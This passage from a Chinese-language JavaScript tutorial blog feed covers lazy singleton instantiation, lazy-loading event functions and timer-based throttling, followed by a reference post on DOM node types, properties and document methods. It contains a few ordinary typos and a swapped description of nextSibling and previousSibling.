<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 惰性实列化代码如下</span></span><br><span class="line"><span class="keyword">var</span> myNamespace = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> Configure = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> privateName = <span class="string">"tugenhua"</span>;</span><br><span class="line">        <span class="keyword">var</span> privateGetName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> privateName;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">var</span> privateSetName = <span class="function"><span class="keyword">function</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">            privateName = name;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 返回单列对象</span></span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            setName: <span class="function"><span class="keyword">function</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">                privateSetName(name);</span><br><span class="line">            &#125;,</span><br><span class="line">            getName: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> privateGetName();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">// 存储Configure实列</span></span><br><span class="line">    <span class="keyword">var</span> instance;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        init: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="comment">// 如果不存在实列，就创建单列实列</span></span><br><span class="line">            <span class="keyword">if</span>(!instance) &#123;</span><br><span class="line">                instance = Configure();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 创建Configure单列</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> key <span class="keyword">in</span> instance) &#123;</span><br><span class="line">                <span class="keyword">if</span>(instance.hasOwnProperty(key)) &#123;</span><br><span class="line">                    <span class="keyword">this</span>[key] = instance[key];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">this</span>.init = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;();</span><br><span class="line"><span class="comment">// 调用方式</span></span><br><span class="line">myNamespace.init();</span><br><span class="line"><span class="keyword">var</span> name = myNamespace.getName();</span><br><span class="line"><span class="built_in">console</span>.log(name); <span class="comment">// tugenhua</span></span><br></pre></td></tr></table></figure>
<p>如上代码是惰性化实列代码：它包括一个单体Configure实列，直接返回init函数，先判断该单体是否被实列化，如果没有被实列化的话，则创建并执行实列化并返回该实列化，如果已经实列化了，则返回现有实列；执行完后，则销毁init方法，只初始化一次</p>
<p>十：惰性载入函数（也是解决兼容问题的）<br>和上面分支的原理是一样的，代码也可以按照上面的推荐分支风格编码的；解决的问题也是解决多个if条件判断的；代码如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 代码如下：</span></span><br><span class="line"><span class="keyword">var</span> addEvent = <span class="function"><span class="keyword">function</span>(<span class="params">el,type,handler</span>)</span>&#123;</span><br><span class="line">    addEvent = el.addEventListener ? <span class="function"><span class="keyword">function</span>(<span class="params">el,type,handler</span>)</span>&#123;</span><br><span class="line">        el.addEventListener(type,handler,<span class="literal">false</span>);</span><br><span class="line">    &#125; : <span class="function"><span class="keyword">function</span>(<span class="params">el,type,handler</span>) </span>&#123;</span><br><span class="line">        el.attachEvent(<span class="string">"on"</span> + type,handler);</span><br><span class="line">    &#125;</span><br><span class="line">    addEvent(el,type,handler);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>惰性载入函数也是在函数内部改变自身的一种方式，在重复执行的时候就不会再进行检测的；惰性载入函数的分支只会执行一次，即第一次调用的时候，其优点如下：</p>
<ol>
<li><p>要执行的适当代码只有在实际调用函数时才执行。</p>
</li>
<li><p>第一次调用该函数的时候，紧接着内部函数也会执行，但是正因为这个，所以后续继续调用该函数的话，后续的调用速度会很快；因此避免了多重条件；</p>
</li>
</ol>
<h3 id="十一：理解函数节流"><a href="#十一：理解函数节流" class="headerlink" title="十一：理解函数节流"></a>十一：理解函数节流</h3><p>DOM操作的交互需要更多的内存和CPU时间，连续进行过多的DOM相关的操作可能会导致浏览器变慢甚至崩溃，函数节流的设计思想是让某些代码可以在间断的情况下连续重复执行，实现该方法可以使用定时器对该函数进行节流操作;</p>
<p>比如：第一次调用函数的时候，创建一个定时器，在指定的时间间隔下执行代码。当第二次执行的时候，清除前一次的定时器并设置另一个，将其替换成一个新的定时器;</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 如下简单函数节流代码演示</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">throttle</span>(<span class="params">method, context</span>) </span>&#123;</span><br><span class="line">    clearTimeout(method.tId);</span><br><span class="line">    method.tId = setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        method.call(context);</span><br><span class="line">    &#125;,<span class="number">500</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 执行操作</span></span><br><span class="line"><span class="built_in">window</span>.onresize = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    throttle(handle, <span class="built_in">window</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>函数节流解决的问题是一些代码(比如事件)无间断的执行，这可能会影响浏览器的性能，比如浏览器变慢或者直接崩溃。比如对于<code>mouseover</code>事件或者<code>click</code>事件，比如点击tab项菜单，无限的点击，有可能会导致浏览器会变慢操作，这时候我们可以使用函数节流的操作来解决；</p>
]]></content>
      <categories>
        <category>ECMA</category>
      </categories>
      <tags>
        <tag>ECMA</tag>
        <tag>call</tag>
        <tag>apply</tag>
      </tags>
  </entry>
  <entry>
    <title>ECMA-DOM详解</title>
    <url>/2018/04/17/ECMA_DOM%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<h2 id="一、节点概览"><a href="#一、节点概览" class="headerlink" title="一、节点概览"></a>一、节点概览</h2><h4 id="DOM文档对象模型"><a href="#DOM文档对象模型" class="headerlink" title="DOM文档对象模型"></a>DOM文档对象模型</h4><p>概念：DOM的目的是为使用JavaScript操作DOM提供编程接口</p>
<h4 id="节点类型"><a href="#节点类型" class="headerlink" title="节点类型"></a>节点类型</h4><h5 id="全部的节点类型"><a href="#全部的节点类型" class="headerlink" title="全部的节点类型"></a>全部的节点类型</h5><p>Node构造函数的属性，也是节点属性 nodeType 的值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ELEMENT_NODE----1</span><br><span class="line">ATTRIBUTE_NODE----2</span><br><span class="line">TEXT_NODE----3</span><br><span class="line">CDATA_SECTION_NODE----4</span><br><span class="line">ENTITY_REFERENCE_NODE----5</span><br><span class="line">ENTITY_NODE----6</span><br><span class="line">PROCESSING_INSTRUCTION_NODE----7</span><br><span class="line">COMMENT_NODE----8</span><br><span class="line">DOCUMENT_NODE----9</span><br><span class="line">DOCUMENT_TYPE_NODE----10</span><br><span class="line">DOCUMENT_FRAGMENT_NODE----11</span><br><span class="line">NOTATION_NODE----12</span><br><span class="line">DOCUMENT_POSITION_DISCONNECTED----1</span><br><span class="line">DOCUMENT_POSITION_PRECEDING----2</span><br><span class="line">DOCUMENT_POSITION_FOLLOWING----4</span><br><span class="line">DOCUMENT_POSITION_CONTAINS----8</span><br><span class="line">DOCUMENT_POSITION_CONTAINED_BY----16</span><br><span class="line">DOCUMENT_POSITION_IMPLEMENTATION_SPECIFIC----32</span><br></pre></td></tr></table></figure>
<h5 id="常用节点类型"><a href="#常用节点类型" class="headerlink" title="常用节点类型"></a>常用节点类型</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DOCUMENT_NODE ---- 9 (window.document)</span><br><span class="line">ELEMENT_NODE ---- 1 (&lt;body&gt; &lt;p&gt; 等标签元素)</span><br><span class="line">ATTRIBUTE_NODE ---- 2 (class=&quot;test&quot;)</span><br><span class="line">TEXT_BODE ---- 3 (文本节点)</span><br><span class="line">DOCUMENT_FRAGMENT_NODE ---- 11 (document.createDocumentFragment())</span><br><span class="line">DOCUMENT_TYPE_NODE ---- 10 (&lt;!DOCUMENT html&gt;)</span><br></pre></td></tr></table></figure>
<h5 id="节点继承链"><a href="#节点继承链" class="headerlink" title="节点继承链"></a>节点继承链</h5><p>所有节点类型都继承自Node，并且这个继承链可能更长</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Object -&gt; EventTarget -&gt; Node -&gt; Element -&gt; HTMLElement -&gt; HTML*Element</span><br><span class="line">Object -&gt; EventTarget -&gt; Node -&gt; Attr (DOM4 弃用)</span><br><span class="line">Object -&gt; EventTarget -&gt; Node -&gt; CharacterData -&gt; Text</span><br><span class="line">Object -&gt; EventTarget -&gt; Node -&gt; Document -&gt; HTMLDocument</span><br><span class="line">Object -&gt; EventTarget -&gt; Node -&gt; DocumentFragment</span><br></pre></td></tr></table></figure>
<p>继承链中的每一个环节都为最终的节点类型提供了大量的属性和方法</p>
<h4 id="节点属性"><a href="#节点属性" class="headerlink" title="节点属性"></a>节点属性</h4><h6 id="nodeType"><a href="#nodeType" class="headerlink" title="nodeType"></a>nodeType</h6><ul>
<li>读写特性：只读</li>
<li>描述：节点的类型，返回以上常量值</li>
</ul>
<h6 id="nodeName"><a href="#nodeName" class="headerlink" title="nodeName"></a>nodeName</h6><ul>
<li>读写特性：只读</li>
<li>描述：节点名字，该属性的返回值根据节点类型不同而异：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">元素节点返回标签名，与 tagName 值相同</span><br><span class="line">文本节点返回 #text</span><br><span class="line">Comment 节点返回 #comment</span><br><span class="line">Document 返回 #document</span><br><span class="line">DocumentFragment 返回 #document-fragment</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h6 id="nodeValue"><a href="#nodeValue" class="headerlink" title="nodeValue"></a>nodeValue</h6><ul>
<li>读写特性：读写</li>
<li><p>描述：</p>
<p>  除了 Text 和 Comment 节点以及 Attr 节点，所有节点的 nodeValue 都返回 null<br>  nodeValue 的作用就是获取 Text 和 Comment 节点的实际文本字符串，也可以通过设置 nodeValue 的值修改 这两个节点内的文本内容</p>
</li>
</ul>
<h6 id="innerHTML"><a href="#innerHTML" class="headerlink" title="innerHTML"></a>innerHTML</h6><ul>
<li>读写特性：读写</li>
<li><p>描述：</p>
<p>  读：读取元素节点的内容(标签和文本)作为JavaScript字符串</p>
<p>  写：设置元素节点的内容(标签将被解析为真正的HTML元素)。</p>
<p class="tip"><br>  注意：因为 innerHTML 会调用一个沉重且高消耗的HTML解析器。所以慎用<br></p>

</li>
</ul>
<h6 id="outerHTML"><a href="#outerHTML" class="headerlink" title="outerHTML"></a>outerHTML</h6><ul>
<li>读写特性：读写</li>
<li><p>描述：</p>
<p>  读：读取包含元素本身及其内容作为JavaScript字符串</p>
<p>  写：设置的内容将替换自身标签将被解析为真正的HTML元素()</p>
</li>
</ul>
<h6 id="textContent"><a href="#textContent" class="headerlink" title="textContent"></a>textContent</h6><ul>
<li>读写特性：读写</li>
<li><p>描述：</p>
<p>  读：获取元素节点内所有文本节点的值，包括其子元素节点的文本节点</p>
<p>  写：将JavaScript字符串创建为文本节点作为该元素的子节点(原有的所有子节点将被删除)</p>
</li>
</ul>
<p class="tip"><br>    注意：在 文档节点(document) 或 文档类型节点(document.doctype) 调用 textContent 返回 null<br>        textContent 属性也能返回 <code>&lt;script&gt;</code> <code>&lt;style&gt;</code> 标签的内容<br></p>

<h6 id="childNodes"><a href="#childNodes" class="headerlink" title="childNodes"></a>childNodes</h6><ul>
<li>读写特性：只读</li>
<li><p>描述：</p>
<p>  返回调用该方法的元素下所有“直属”子节点。包括元素节点，文本节点，注释节点等等所有节点。</p>
<p>  返回的集合是 NodeList</p>
</li>
</ul>
<h6 id="parentNode"><a href="#parentNode" class="headerlink" title="parentNode"></a>parentNode</h6><ul>
<li>读写特性：只读</li>
<li>描述：返回调用该方法的节点的父节点</li>
</ul>
<h6 id="firstChild"><a href="#firstChild" class="headerlink" title="firstChild"></a>firstChild</h6><ul>
<li>读写特性：只读</li>
<li>描述：返回调用该方法的节点的第一个子节点</li>
</ul>
<h6 id="lastChild"><a href="#lastChild" class="headerlink" title="lastChild"></a>lastChild</h6><ul>
<li>读写特性：只读</li>
<li>描述：返回调用该方法的节点的最后一个子节点</li>
</ul>
<h6 id="nextSibling"><a href="#nextSibling" class="headerlink" title="nextSibling"></a>nextSibling</h6><ul>
<li>读写特性：只读</li>
<li>描述：返回调用该方法的节点的前一个兄弟节点</li>
</ul>
<h6 id="previousSibling"><a href="#previousSibling" class="headerlink" title="previousSibling"></a>previousSibling</h6><ul>
<li>读写特性：只读</li>
<li>描述：返回调用该方法的节点的后一个兄弟节点</li>
</ul>
<h6 id="children"><a href="#children" class="headerlink" title="children"></a>children</h6><ul>
<li>读写特性：只读</li>
<li>描述：返回调用该方法的所有元素子节点</li>
</ul>
<h6 id="parentElement"><a href="#parentElement" class="headerlink" title="parentElement"></a>parentElement</h6><ul>
<li>读写特性：只读</li>
<li>描述：返回调用该方法的节点的父元素节点</li>
</ul>
<h6 id="firstElementChild"><a href="#firstElementChild" class="headerlink" title="firstElementChild"></a>firstElementChild</h6><ul>
<li>读写特性：只读</li>
<li>描述：返回调用该方法的节点的第一个“元素”子节点</li>
</ul>
<h6 id="lastElementChuild"><a href="#lastElementChuild" class="headerlink" title="lastElementChuild"></a>lastElementChuild</h6><ul>
<li>读写特性：只读</li>
<li>描述：返回调用该方法的节点的最后一个“元素”子节点</li>
</ul>
<h6 id="nextElementSibling"><a href="#nextElementSibling" class="headerlink" title="nextElementSibling"></a>nextElementSibling</h6><ul>
<li>读写特性：只读</li>
<li>描述：返回调用该方法的节点的下一个兄弟“元素”节点</li>
</ul>
<h6 id="previousElementSibling"><a href="#previousElementSibling" class="headerlink" title="previousElementSibling"></a>previousElementSibling</h6><ul>
<li>读写特性：只读</li>
<li>描述：返回调用该方法的节点的前一个兄弟“元素”节点</li>
</ul>
<h6 id="ownerDocument"><a href="#ownerDocument" class="headerlink" title="ownerDocument"></a>ownerDocument</h6><ul>
<li>读写特性：只读</li>
<li>描述：返回该节点所在的 document 对象，document.ownerDocument === null</li>
</ul>
<h4 id="节点方法"><a href="#节点方法" class="headerlink" title="节点方法"></a>节点方法</h4><h6 id="insertAdjacentHTML-position-text"><a href="#insertAdjacentHTML-position-text" class="headerlink" title="insertAdjacentHTML(position, text)"></a>insertAdjacentHTML(position, text)</h6><ul>
<li><p>描述：</p>
<p>  指定在 开标签前后 或者 闭标签前后 插入HTML文本。</p>
</li>
<li><p>参数：</p>
<ul>
<li><code>{String} position</code> 插入的位置：<ul>
<li><code>beforebegin</code> 开标签前</li>
<li><code>afterbegin</code> 开标签后</li>
<li><code>beforeend</code> 闭标签前</li>
<li><code>afterend</code> 闭标签后</li>
</ul>
</li>
<li><code>{String} text</code> 插入的内容，字符串。与 innerHTML的行为相同</li>
</ul>
</li>
<li><p>延伸：</p>
<p>  除火狐浏览器外，所有现代浏览器都可以使用下面两个方法：</p>
<ul>
<li>insertAdjacentElement():</li>
<li>insertAdjacentText():</li>
</ul>
</li>
</ul>
<h6 id="appendChild-element"><a href="#appendChild-element" class="headerlink" title="appendChild(element)"></a>appendChild(element)</h6><ul>
<li><p>描述：将指定节点插入到调用该方法的子节点末尾</p>
</li>
<li><p>参数：</p>
<ul>
<li><code>{Element} element</code> 要插入的节点</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li><code>{Element}</code> 被插入的节点</li>
</ul>
</li>
</ul>
<h6 id="insertBefore-element-target"><a href="#insertBefore-element-target" class="headerlink" title="insertBefore(element, target)"></a>insertBefore(element, target)</h6><ul>
<li><p>描述：在调用该方法的元素的指定子节点之前插入所给节点，如果省略第二个参数，那么行为与appendChild相同</p>
</li>
<li><p>参数：</p>
<ul>
<li><code>{Element} element</code> 要插入的节点</li>
<li><code>{Element} target</code> 想要在哪个节点之前插入的该节点的引用</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li><code>{Element}</code> 被插入的节点</li>
</ul>
</li>
</ul>
<h6 id="removeChild-element"><a href="#removeChild-element" class="headerlink" title="removeChild(element):"></a>removeChild(element):</h6><ul>
<li><p>描述：移除调用该方法的元素的子节点</p>
</li>
<li><p>参数：</p>
<ul>
<li><code>{Element} element</code> 要移除的子节点</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li><code>{Element}</code> 被移除节点的引用</li>
</ul>
</li>
</ul>
<h6 id="replaceChild-element-target"><a href="#replaceChild-element-target" class="headerlink" title="replaceChild(element, target)"></a>replaceChild(element, target)</h6><ul>
<li><p>描述：使用新节点替换调用该方法的元素的指定子节点</p>
</li>
<li><p>参数：</p>
<ul>
<li><code>{Element} element</code> 新子节点</li>
<li><code>{Element} target</code> 要替换的子节点</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li><code>{Element}</code> 被替换节点的引用</li>
</ul>
</li>
</ul>
<h6 id="cloneNode-deep"><a href="#cloneNode-deep" class="headerlink" title="cloneNode(deep)"></a>cloneNode(deep)</h6><ul>
<li><p>描述：深/浅 复制调用该方法的节点</p>
</li>
<li><p>参数：</p>
<ul>
<li><code>{Boolean} deep</code> true表示深复制，false表示浅复制，默认为false</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li><code>{Element}</code> 克隆的节点</li>
</ul>
</li>
</ul>
<p class="tip"><br>注意：无论深复制还是浅复制，都只会复制节点的内联事件，任何通过 addEventListener 或 onxxx 添加的事件都不会被复制<br></p>

<h6 id="contains-element"><a href="#contains-element" class="headerlink" title="contains(element)"></a>contains(element)</h6><ul>
<li><p>描述：判断调用该方法的节点是否包含给定的节点</p>
</li>
<li><p>参数：</p>
<ul>
<li><code>{Element} element</code> 节点</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li><code>{Boolean}</code> ture 包含，fals 不包含</li>
</ul>
</li>
</ul>
<h6 id="compareDocumentPosition-element"><a href="#compareDocumentPosition-element" class="headerlink" title="compareDocumentPosition(element)"></a>compareDocumentPosition(element)</h6><ul>
<li><p>描述：对比传入节点和调用该方法的节点的位置。</p>
</li>
<li><p>参数：</p>
<ul>
<li><code>{Element} element</code> 节点</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li><code>{Number}</code> 数字，口诀如下：该口诀中的位置是 传入节点 相对于 调用该方法节点 的<br><code>前2后4里20，同0外10不在1</code></li>
</ul>
</li>
</ul>
<h4 id="节点集合"><a href="#节点集合" class="headerlink" title="节点集合"></a>节点集合</h4><p><code>NodeList</code> 或 <code>HTMLCollection</code></p>
<ul>
<li>特点：<ul>
<li>类数组对象</li>
<li>拥有 length 属性</li>
<li>实时节点树，每当文档结构发生变化时，他们都会得到更新</li>
<li>集合的节点顺序与节点所在树中的顺序相同(深度优先)</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可以将节点集合(NodeList 或 HTMLCollection)转为数组，这样做的好处有两点：</span><br><span class="line">    1、因为这两个集合是动态的，转为数组可以创建当前集合的快照。</span><br><span class="line">    2、转为数组可以使用Array原型下的许多数组方法</span><br><span class="line">    将NodeList或HTMLCollection转为数组的方法有：</span><br><span class="line">        Array.prototype.clice.call(list) // 或者 Array.prototype.concat.call(list)</span><br><span class="line">        Array.from(list)</span><br></pre></td></tr></table></figure>
<h2 id="二、文档节点"><a href="#二、文档节点" class="headerlink" title="二、文档节点"></a>二、文档节点</h2><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><ul>
<li>节点类型：DOCUMENT_NODE —- 9</li>
<li>继承链： Object -&gt; EventTarget -&gt; Node -&gt; Document -&gt; HTMLDocument</li>
<li>示例：window.document</li>
</ul>
<h4 id="文档节点属性"><a href="#文档节点属性" class="headerlink" title="文档节点属性"></a>文档节点属性</h4><h6 id="title"><a href="#title" class="headerlink" title="title"></a>title</h6><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取文档标题</span></span><br><span class="line"><span class="built_in">document</span>.title</span><br></pre></td></tr></table></figure>
<h6 id="referrer"><a href="#referrer" class="headerlink" title="referrer"></a>referrer</h6><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取提及者</span></span><br><span class="line"><span class="built_in">document</span>.referrer</span><br></pre></td></tr></table></figure>
<h6 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h6><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取文档url连接地址</span></span><br><span class="line"><span class="built_in">document</span>.URL</span><br></pre></td></tr></table></figure>
<h6 id="lastModified"><a href="#lastModified" class="headerlink" title="lastModified"></a>lastModified</h6><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取文档最后修改时间</span></span><br><span class="line"><span class="built_in">document</span>.lastModified</span><br></pre></td></tr></table></figure>
<h6 id="compatMode"><a href="#compatMode" class="headerlink" title="compatMode"></a>compatMode</h6><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取兼容模式 BackCompat: 怪异模式，CSS1Compat: 严格模式</span></span><br><span class="line"><span class="built_in">document</span>.compatMode</span><br></pre></td></tr></table></figure>
<h6 id="doctype"><a href="#doctype" class="headerlink" title="doctype"></a>doctype</h6><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 取得 &lt;!DOCTYPE html&gt; 元素</span></span><br><span class="line"><span class="built_in">document</span>.doctype</span><br></pre></td></tr></table></figure>
<h6 id="documentElement"><a href="#documentElement" class="headerlink" title="documentElement"></a>documentElement</h6><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 取得 &lt;html&gt; 元素</span></span><br><span class="line"><span class="built_in">document</span>.documentElement</span><br></pre></td></tr></table></figure>
<h6 id="head"><a href="#head" class="headerlink" title="head"></a>head</h6><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 取得 &lt;head&gt; 元素</span></span><br><span class="line"><span class="built_in">document</span>.head</span><br></pre></td></tr></table></figure>
<h6 id="links"><a href="#links" class="headerlink" title="links"></a>links</h6><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 取得所有 &lt;a&gt; 元素</span></span><br><span class="line"><span class="built_in">document</span>.links</span><br></pre></td></tr></table></figure>
<h6 id="links-1"><a href="#links-1" class="headerlink" title="links"></a>links</h6><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 取得文档的所有样式表</span></span><br><span class="line"><span class="built_in">document</span>.styleSheets</span><br></pre></td></tr></table></figure>
<h6 id="activeElement"><a href="#activeElement" class="headerlink" title="activeElement"></a>activeElement</h6><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 取得文档中聚焦(获得焦点)的元素</span></span><br><span class="line"><span class="built_in">document</span>.activeElement</span><br></pre></td></tr></table></figure>
<h6 id="defaultView"><a href="#defaultView" class="headerlink" title="defaultView"></a>defaultView</h6><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取顶部对象/全局对象，在浏览器中为 window，在其他JavaScript环境为该环境的顶部对象</span></span><br><span class="line"><span class="built_in">document</span>.defaultView</span><br></pre></td></tr></table></figure>
<h6 id="all"><a href="#all" class="headerlink" title="all"></a>all</h6><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 文档中所有元素组成的集合</span></span><br><span class="line"><span class="built_in">document</span>.all</span><br></pre></td></tr></table></figure>
<h6 id="forms"><a href="#forms" class="headerlink" title="forms"></a>forms</h6><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 文档中所有 &lt;form&gt; 元素组成的集合</span></span><br><span class="line"><span class="built_in">document</span>.forms</span><br></pre></td></tr></table></figure>
<h6 id="images"><a href="#images" class="headerlink" title="images"></a>images</h6><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 文档中所有的 &lt;img&gt; 元素组成的集合</span></span><br><span class="line"><span class="built_in">document</span>.images</span><br></pre></td></tr></table></figure>
<h6 id="scripts"><a href="#scripts" class="headerlink" title="scripts"></a>scripts</h6><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 文档中所有 &lt;script&gt; 元素组成的集合</span></span><br><span class="line"><span class="built_in">document</span>.scripts</span><br></pre></td></tr></table></figure>
<h4 id="文档节点方法"><a href="#文档节点方法" class="headerlink" title="文档节点方法"></a>文档节点方法</h4><h6 id="document-createElement-tagName"><a href="#document-createElement-tagName" class="headerlink" title="document.createElement(tagName)"></a>document.createElement(tagName)</h6><ul>
<li><p>描述：创建元素节点</p>
</li>
<li><p>参数：</p>
<ul>
<li><code>{String} tagName</code> 要创建的元素名字</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li><code>{Element}</code> 创建的新元素</li>
</ul>
</li>
</ul>
<h6 id="document-createTextNode-text"><a href="#document-createTextNode-text" class="headerlink" title="document.createTextNode(text)"></a>document.createTextNode(text)</h6><ul>
<li><p>描述：创建文本节点</p>
</li>
<li><p>参数：</p>
<ul>
<li><code>{String} text</code> 文本内容，作为文本节点的 nodeValue 的值</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li><code>{TEXT_NODE}</code> 创建的新文本节点</li>
</ul>
</li>
</ul>
<h6 id="document-createComment-text"><a href="#document-createComment-text" class="headerlink" title="document.createComment(text)"></a>document.createComment(text)</h6><ul>
<li><p>描述：创建注释节点</p>
</li>
<li><p>参数：</p>
<ul>
<li><code>{String} text</code> 注释内容，作为注释节点的 nodeValue 的值</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li><code>{COMMENT_NODE}</code> 创建的新注释节点</li>
</ul>
</li>
</ul>
<h6 id="document-createDocumentFragment"><a href="#document-createDocumentFragment" class="headerlink" title="document.createDocumentFragment()"></a>document.createDocumentFragment()</h6><ul>
<li><p>描述：创建文档碎片</p>
</li>
<li><p>返回值：</p>
<ul>
<li><code>{DOCUMENT_FRAGMENT_NODE}</code> 文档碎片</li>
</ul>
</li>
</ul>
<h6 id="document-hasFocus"><a href="#document-hasFocus" class="headerlink" title="document.hasFocus()"></a>document.hasFocus()</h6><ul>
<li><p>描述：</p>
<p>  判断当前文档是否获得焦点（切换浏览器tab页到其他页面，该方法即返回false）</p>
</li>
<li><p>返回值：</p>
<ul>
<li><code>{Boolean}</code> true 代表文档获得焦点，false 代表没有获得焦点</li>
</ul>
</li>
</ul>
<h6 id="document-getElementById-id"><a href="#document-getElementById-id" class="headerlink" title="document.getElementById(id)"></a>document.getElementById(id)</h6><ul>
<li><p>描述：根据传入的id值匹配元素节点</p>
</li>
<li><p>参数：</p>
<ul>
<li><code>{String} id</code> id值</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li><code>{Element | null}</code> 匹配则返回元素节点，否则返回 null</li>
</ul>
</li>
</ul>
<h6 id="document-elementFromPoint-x-y"><a href="#document-elementFromPoint-x-y" class="headerlink" title="document.elementFromPoint(x, y)"></a>document.elementFromPoint(x, y)</h6><ul>
<li><p>描述：获取文档上某一点最顶层的元素</p>
</li>
<li><p>参数：</p>
<ul>
<li><code>{Number} x</code> 横坐标</li>
<li><code>{Number} y</code> 纵坐标</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li><code>{Element}</code> 该点所在的最顶层元素</li>
</ul>
</li>
</ul>
<h6 id="document-implementation-createHTMLDocument"><a href="#document-implementation-createHTMLDocument" class="headerlink" title="document.implementation.createHTMLDocument()"></a>document.implementation.createHTMLDocument()</h6><ul>
<li><p>描述：创建一个当前文档之外的HTML文档</p>
</li>
<li><p>返回值：</p>
<ul>
<li><code>{Document}</code> 文档引用</li>
</ul>
</li>
</ul>
<h6 id="document-implementation-hasFeature-feature-version"><a href="#document-implementation-hasFeature-feature-version" class="headerlink" title="document.implementation.hasFeature(feature, version)"></a>document.implementation.hasFeature(feature, version)</h6><ul>
<li><p>描述：探测浏览器是否支持指定版本的特性/模块</p>
</li>
<li><p>参数：</p>
<ul>
<li><code>{String} feature</code> 特性名字</li>
<li><p><code>{Number} version</code> 版本</p>
<p>可传参数如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">| feature       | version       |</span><br><span class="line">| ------------- | ------------- |</span><br><span class="line">| Core          | 1.0/2.0/3.0   |</span><br><span class="line">| XML           | 1.0/2.0/3.0   |</span><br><span class="line">| HTML          | 1.0/2.0       |</span><br><span class="line">| Views         | 2.0           |</span><br><span class="line">| StyleSheets   | 2.0           |</span><br><span class="line">| CSS           | 2.0           |</span><br><span class="line">| CSS2          | 2.0           |</span><br><span class="line">| Events        | 2.0/3.0       |</span><br><span class="line">| UIEvents      | 2.0/3.0       |</span><br><span class="line">| MouseEvents   | 2.0/3.0       |</span><br><span class="line">| MutationEvents| 2.0/3.0       |</span><br><span class="line">| HTMLEvents    | 2.0           |</span><br><span class="line">| Range         | 2.0           |</span><br><span class="line">| Traversal     | 2.0/3.0       |</span><br><span class="line">| LS            | 3.0           |</span><br><span class="line">| LS-Async      | 3.0           |</span><br><span class="line">| Validation    | 3.0           |</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li><code>{Boolean}</code> 支持则返回 true，否则返回 false</li>
</ul>
</li>
</ul>
